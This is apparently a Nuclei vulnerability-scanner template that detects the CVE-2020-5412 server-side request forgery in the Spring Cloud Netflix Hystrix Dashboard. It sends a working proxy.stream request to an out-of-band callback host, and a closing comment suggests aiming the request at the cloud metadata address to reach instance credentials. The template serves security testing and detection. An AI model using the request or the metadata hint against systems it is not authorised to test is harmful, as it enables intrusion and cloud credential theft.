id: CVE-2020-5412

info:
  name: Spring Cloud Netflix - Server-Side Request Forgery
  author: dwisiswant0
  severity: medium
  description: Spring Cloud Netflix 2.2.x prior to 2.2.4, 2.1.x prior to 2.1.6, and older unsupported versions are susceptible to server-side request forgery. Applications can use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. An attacker can send a request to other servers and thus potentially access sensitive information, modify data, and/or execute unauthorized operations.
  impact: |
    The vulnerability can result in unauthorized access to sensitive data or systems, leading to potential data breaches or further exploitation.
  remediation: |
    Apply the latest security patches or updates provided by Spring Cloud Netflix to mitigate the vulnerability.
  reference:
    - https://tanzu.vmware.com/security/cve-2020-5412
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5412
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/Elsfa7-110/kenzer-templates
    - https://github.com/pen4uin/awesome-vulnerability-research
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2020-5412
    cwe-id: CWE-610,CWE-441
    epss-score: 0.92222
    epss-percentile: 0.99699
    cpe: cpe:2.3:a:vmware:spring_cloud_netflix:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: vmware
    product: spring_cloud_netflix
  tags: cve,cve2020,ssrf,springcloud,vmware,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/proxy.stream?origin=http://{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: header
        words:
          - "Jelly"

      - type: status
        status:
          - 200

# To get crithit, try http://169.254.169.254/latest/metadata/
# digest: 4a0a0047304502206b750309c009432499eac9b185372566371ce316718974be314b89a8f39a6460022100c67d067d2cd39c8f8eb0e33de70e22e92c4b8252d546c8783f814f02ce0189d0:922c64590222798bb761d5b6d8e72950